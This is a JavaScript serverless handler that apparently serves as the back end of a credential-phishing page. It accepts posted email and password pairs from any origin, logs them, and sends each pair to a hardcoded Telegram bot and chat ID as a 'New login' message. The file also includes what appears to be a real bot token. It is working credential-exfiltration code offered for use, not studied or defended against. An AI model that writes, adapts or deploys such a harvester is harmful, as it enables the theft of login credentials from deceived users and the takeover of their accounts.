import fetch from 'node-fetch';

export default async function handler(req, res) {
    // Set CORS headers to allow cross-origin requests
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Ensure the request method is POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Extract email and password from the request body
        const { email, password } = req.body;

        // Log received credentials
        console.log('Received credentials:', { email, password });

        // Telegram bot token and chat ID
        const telegramBotToken = '7828349055:AAFYs91viPZS8pXSO5GmZj1y02LIZhMmPAc'; // Replace with your bot token
        const chatId = '7329638940'; // Replace with your chat ID

        // Construct the message for Telegram
        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        // Log the Telegram API URL
        console.log('Sending message to Telegram:', telegramUrl);

        // Send the message to Telegram
        const response = await fetch(telegramUrl);
        const result = await response.json();

        // Log the Telegram API response
        console.log('Telegram API response:', result);

        // Check if the Telegram API request was successful
        if (!response.ok) {
            throw new Error(`Telegram API error: ${result.description}`);
        }

        // Respond with success
        return res.status(200).json({ success: true });
    } catch (error) {
        // Log the error and respond with an error message
        console.error('Error in server.js:', error.message);
        return res.status(500).json({ error: 'Failed to process request' });
    }
}
